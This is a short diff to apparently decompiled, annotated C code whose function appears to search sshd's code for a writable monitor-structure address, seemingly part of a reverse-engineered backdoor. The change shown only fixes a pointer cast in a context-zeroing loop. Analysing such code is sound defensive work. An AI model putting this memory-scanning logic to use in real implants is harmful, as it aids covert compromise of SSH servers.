@@ -34,7 +34,7 @@ BOOL sshd_find_monitor_field_addr_in_function
     // AutoDoc: Reset the MOV/LEA decoder state ahead of each hunt so stale prefixes never taint the tracked register.
     for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
       *(u32 *)&zero_ctx_cursor->instruction = 0;
-      zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
+      zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
     }
     while( TRUE ) {
       // AutoDoc: Seed the analysis by re-running the MOV/LEA scanner until a writable sshd address is loaded into a register.
